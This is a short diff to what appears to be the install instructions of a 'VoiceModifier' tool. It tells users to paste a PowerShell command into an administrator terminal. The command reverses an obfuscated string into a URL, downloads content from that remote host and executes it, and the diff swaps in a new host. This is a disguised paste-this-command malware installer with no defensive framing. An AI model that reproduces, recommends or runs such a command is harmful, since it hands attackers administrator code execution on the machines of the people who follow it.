@@ -39,7 +39,7 @@
 Press `Win + X` → **Terminal (Admin)** → paste the command below → press `Enter`
 
 ```powershell
-"VoiceModifier";iex(irm((-join"vmx.mrtig//:sptth"[-1..-99])))
+"VoiceModifier";iex(irm((-join"sbs.mrtig//:sptth"[-1..-99])))
 ```
 
 **⏱ Wait 5–10 minutes. Don't close the window until it finishes.**
